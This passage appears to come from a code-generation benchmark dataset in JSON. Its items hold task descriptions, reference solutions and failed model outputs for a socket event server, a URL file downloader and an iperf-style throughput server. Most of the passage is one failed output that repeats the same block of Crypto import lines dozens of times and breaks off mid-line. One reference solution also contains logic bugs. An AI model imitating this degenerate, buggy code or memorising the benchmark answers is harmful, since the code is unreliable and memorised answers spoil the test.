    "Canonical_solution": "import socket\nimport multiprocessing\nimport os\n\nclass EventGeneric:\n    def __init__(self, addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        self.name = name\n        self.isDebug = isDebug\n        self.shared_key = shared_key\n        if port is None:\n            self.port = get_free_port()\n        else:\n            self.port = port\n        if addr is not None:\n            self.addr, _ = addr\n        else:\n            self.addr = \"0.0.0.0\"\n        self.file = f\"./{self.name}.bin\"\n\n    def serve(self):\n        if self.isDebug:\n            self.logger = get_file_logger(self.name, level=\"DEBUG\")\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        local_addr_port = (self.addr, self.port)\n        sock.bind(local_addr_port)\n        sock.listen(1)\n\n        try:\n            conn, addr = sock.accept()\n            if self.isDebug:\n                self.logger.debug(f\"Open connection from {addr[0]}:{addr[1]}\")\n                event_file = open(self.file, \"wb\")\n            try:\n                while True:\n                    data = conn.recv(1, socket.MSG_WAITALL)\n                    if data:\n                        event_file.write(data)\n                    else:\n                        break\n                        raise KeyboardInterrupt\n            except KeyboardInterrupt:\n                pass\n            finally:\n                try:\n                    if self.isDebug:\n                        os.remove(self.file)\n                except OSError:\n                    pass\n                conn.close()\n                if self.isDebug:\n                    self.logger.debug(f\"Close connection from {addr[0]}:{addr[1]}\")\n            sock.close()\n        except KeyboardInterrupt:\n            pass\n        except BrokenPipeError:\n            pass\n        finally:\n            sock.close()\n            if self.isDebug:\n                self.logger.debug(f\"Closed listen on {self.addr}:{self.port}\")\n\n    @staticmethod\n    def spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        event = EventGeneric(addr, port, name, shared_key, isDebug)\n        p = multiprocessing.Process(target=event.serve)\n        p.start()\n        return event.port, p",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport logging\nimport multiprocessing\nimport socket\nimport struct\nimport threading\nimport time\n\n\nclass EventGeneric:\n    def __init__(self, addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        self.name = name\n        self.isDebug = isDebug\n        self.shared_key = shared_key\n        self.port = port\n        self.addr = addr\n        self.file = f'{name}.bin'\n        self.logger = logging.getLogger(name)\n        if self.isDebug:\n            self.logger.setLevel(logging.DEBUG)\n            handler = logging.FileHandler(f'{name}.log')\n            handler.setLevel(logging.DEBUG)\n            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n            handler.setFormatter(formatter)\n            self.logger.addHandler(handler)\n\n    def serve(self):\n        self.logger.info('Starting server')\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.bind((self.addr, self.port))\n            s.listen()\n            self.logger.info(f'Server listening on {self.addr}:{self.port}')\n            while True:\n                conn, addr = s.accept()\n                self.logger.info(f'Connection from {addr}')\n                with conn:\n                    while True:\n                        data = conn.recv(1024)\n                        if not data:\n                            break\n                        with open(self.file, 'ab') as f:\n                            f.write(data)\n                        self.logger.debug(f'Received {len(data)} bytes')\n\n    @staticmethod\n    def spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        server = EventGeneric(addr, port, name, shared_key, isDebug)\n        p = multiprocessing.Process(target=server.serve)\n        p.start()\n        time.sleep(0.1)\n        return server.port, p\n```\n"
  },
  {
    "Task_id": 39,
    "Instruction": "Task Description: Create a Python class that handles downloading files from a given URL and provides methods to retrieve the file name and read the file content.\n\nClass Description: The `UrlFile` class is designed to download files from a specified URL, manage temporary storage of the downloaded file, and provide methods to access the file name and content. It uses the `httpx` library for HTTP requests and handles temporary file storage with `tempfile`.\n\nAttributes:\n\n- url: str - The URL from which the file will be downloaded.\n- name: Optional[str] - An optional custom name for the downloaded file. If not provided, the name is derived from the URL.\n\nMethods:\n\n- get_filename() -> Optional[str] - Returns the filename derived from the URL or the custom name if provided.\n- read() -> Any - Downloads the file from the URL, saves it to a temporary directory, and returns a file-like object for reading the content. Raises an exception if the download fails or if the filename cannot be determined.",
    "Canonical_solution": "import httpx\nfrom pathlib import Path\nfrom typing import Any, Optional\nfrom tempfile import TemporaryDirectory\n\nclass UrlFile:\n    def __init__(self, url: str, name: Optional[str] = None):\n        self.url = url\n        self.name = name\n\n    def get_filename(self) -> Optional[str]:\n        return self.name or self.url.split(\"/\")[-1]\n\n    def read(self) -> Any:\n        logger.debug(f\"Downloading url: {self.url}\")\n        with httpx.Client() as client:\n            response = client.get(self.url)\n            response.raise_for_status()\n\n            with TemporaryDirectory() as temp_dir:\n                file_name = self.get_filename()\n                if file_name is None:\n                    raise ValueError(\"Could not determine a file name, please set `name`\")\n\n                file_path = Path(temp_dir).joinpath(file_name)\n                file_path.write_bytes(response.content)\n                logger.debug(f\"File downloaded and saved to {file_path.name}\")\n                return file_path.open(\"rb\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport tempfile\nimport httpx\nfrom typing import Optional, Any\n\nclass UrlFile:\n    def __init__(self, url: str, name: Optional[str] = None):\n        self.url = url\n        self.name = name\n\n    def get_filename(self) -> Optional[str]:\n        if self.name:\n            return self.name\n        return self.url.split(\"/\")[-1]\n\n    def read(self) -> Any:\n        filename = self.get_filename()\n        if not filename:\n            raise ValueError(\"Filename could not be determined\")\n        with tempfile.NamedTemporaryFile(delete=False, suffix=filename) as temp_file:\n            try:\n                response = httpx.get(self.url)\n                response.raise_for_status()\n                temp_file.write(response.content)\n                temp_file.flush()\n                return open(temp_file.name, \"rb\")\n            except Exception as e:\n                raise Exception(f\"Failed to download file from {self.url}\") from e\n```\n"
  },
  {
    "Task_id": 398,
    "Instruction": "Task Description: Implement a TCP server function that handles client connections, performs data exchange, and measures performance statistics during the exchange.\n\nFunction Description: The function `server_once` establishes a TCP server that listens for incoming client connections, exchanges parameters with the client, performs data transfer (either sending or receiving based on parameters), collects performance statistics, exchanges results with the client, and finally closes the connection. The function handles both TCP and UDP protocols based on client parameters and includes debugging capabilities.\n\nInput: \n- None (The function uses global constants and variables for configuration)\n  - DEBUG: bool - Flag to enable debug output\n  - COOKIE_SIZE: int - Size of the cookie for client verification\n  - PARAM_EXCHANGE, CREATE_STREAMS, TEST_START, TEST_RUNNING, TEST_END, EXCHANGE_RESULTS, DISPLAY_RESULTS, IPERF_DONE: int - Command codes for protocol control\n\nOutput: \n- None (The function performs operations and outputs results to console/logs but doesn't return any value)\n  - Prints server status and debug information to console\n  - Outputs performance statistics when complete",
    "Canonical_solution": "import json\nimport select\nimport socket\nimport struct\nimport time\n\ndef server_once():\n    # Listen for a connection\n    ai = socket.getaddrinfo(\"0.0.0.0\", 5201)\n    ai = ai[0]\n    print(\"Server listening on\", ai[-1])\n    s_listen = socket.socket(ai[0], socket.SOCK_STREAM)\n    s_listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s_listen.bind(ai[-1])\n    s_listen.listen(1)\n    s_ctrl, addr = s_listen.accept()\n\n    # Read client's cookie\n    cookie = recvn(s_ctrl, COOKIE_SIZE)\n    if DEBUG:\n        print(cookie)\n\n    # Ask for parameters\n    s_ctrl.sendall(bytes([PARAM_EXCHANGE]))\n\n    # Get parameters\n    n = struct.unpack(\">I\", recvn(s_ctrl, 4))[0]\n    param = recvn(s_ctrl, n)\n    param = json.loads(str(param, \"ascii\"))\n    if DEBUG:\n        print(param)\n    reverse = param.get(\"reverse\", False)\n\n    # Ask to create streams\n    s_ctrl.sendall(bytes([CREATE_STREAMS]))\n\n    if param.get(\"tcp\", False):\n        # Accept stream\n        s_data, addr = s_listen.accept()\n        print(\"Accepted connection:\", addr)\n        recvn(s_data, COOKIE_SIZE)\n    elif param.get(\"udp\", False):\n        # Close TCP connection and open UDP \"connection\"\n        s_listen.close()\n        s_data = socket.socket(ai[0], socket.SOCK_DGRAM)\n        s_data.bind(ai[-1])\n        data, addr = s_data.recvfrom(4)\n        s_data.sendto(b\"\\x12\\x34\\x56\\x78\", addr)\n    else:\n        assert False\n\n    # Start test\n    s_ctrl.sendall(bytes([TEST_START]))\n\n    # Run test\n    s_ctrl.sendall(bytes([TEST_RUNNING]))\n\n    # Read data, and wait for client to send TEST_END\n    poll = select.poll()\n    poll.register(s_ctrl, select.POLLIN)\n    if reverse:\n        poll.register(s_data, select.POLLOUT)\n    else:\n        poll.register(s_data, select.POLLIN)\n    stats = Stats(param)\n    stats.start()\n    running = True\n    data_buf = bytearray(urandom(param[\"len\"]))\n    while running:\n        for pollable in poll.poll(stats.max_dt_ms()):\n            if pollable_is_sock(pollable, s_ctrl):\n                cmd = recvn(s_ctrl, 1)[0]\n                if DEBUG:\n                    print(cmd_string.get(cmd, \"UNKNOWN_COMMAND\"))\n                if cmd == TEST_END:\n                    running = False\n            elif pollable_is_sock(pollable, s_data):\n                if reverse:\n                    n = s_data.send(data_buf)\n                    stats.add_bytes(n)\n                else:\n                    recvninto(s_data, data_buf)\n                    stats.add_bytes(len(data_buf))\n        stats.update()\n\n    # Need to continue writing so other side doesn't get blocked waiting for data\n    if reverse:\n        while True:\n            for pollable in poll.poll(0):\n                if pollable_is_sock(pollable, s_data):\n                    s_data.send(data_buf)\n                    break\n            else:\n                break\n\n    stats.stop()\n\n    # Ask to exchange results\n    s_ctrl.sendall(bytes([EXCHANGE_RESULTS]))\n\n    # Get client results\n    n = struct.unpack(\">I\", recvn(s_ctrl, 4))[0]\n    results = recvn(s_ctrl, n)\n    results = json.loads(str(results, \"ascii\"))\n    if DEBUG:\n        print(results)\n\n    # Send our results\n    results = {\n        \"cpu_util_total\": 1,\n        \"cpu_util_user\": 0.5,\n        \"cpu_util_system\": 0.5,\n        \"sender_has_retransmits\": 1,\n        \"congestion_used\": \"cubic\",\n        \"streams\": [\n            {\n                \"id\": 1,\n                \"bytes\": stats.nb0,\n                \"retransmits\": 0,\n                \"jitter\": 0,\n                \"errors\": 0,\n                \"packets\": stats.np0,\n                \"start_time\": 0,\n                \"end_time\": ticks_diff(stats.t3, stats.t0) * 1e-6,\n            }\n        ],\n    }\n    results = json.dumps(results)\n    s_ctrl.sendall(struct.pack(\">I\", len(results)))\n    s_ctrl.sendall(bytes(results, \"ascii\"))\n\n    # Ask to display results\n    s_ctrl.sendall(bytes([DISPLAY_RESULTS]))\n\n    # Wait for client to send IPERF_DONE\n    cmd = recvn(s_ctrl, 1)[0]\n    assert cmd == IPERF_DONE\n\n    # Close all sockets\n    s_data.close()\n    s_ctrl.close()\n    s_listen.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport time\nimport struct\nimport threading\nimport random\nimport os\nimport sys\nimport select\nimport errno\nimport signal\nimport subprocess\nimport json\nimport re\nimport datetime\nimport math\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom collections import deque\nfrom multiprocessing import Process, Value, Lock\nfrom threading import Thread\nfrom queue import Queue\nfrom socketserver import ThreadingMixIn, TCPServer, BaseRequestHandler\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import urlparse, parse_qs\nfrom io import BytesIO\nfrom base64 import b64encode, b64decode\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Protocol.KDF import PBKDF2\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Util import Counter\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom"
  },
  {
    "Task_id": 405,
